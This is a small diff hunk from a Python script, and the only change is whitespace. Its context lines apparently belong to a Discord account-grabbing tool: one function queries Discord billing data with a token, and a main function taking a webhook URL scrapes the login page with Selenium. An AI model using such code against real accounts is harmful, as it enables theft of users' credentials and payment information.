@@ -46,8 +46,7 @@ def get_discord_info(tk, link_int):
     elif link_int == 2:
         response = get('https://discordapp.com/api/v9/users/@me/billing/subscriptions',  headers=headers).json()
     return response
-
-
+    
 def main(webhook_url) -> None:
     """Use selenium webdriver to go to the discord login page.
     Then, grab the source of the page and use regex to identify the class
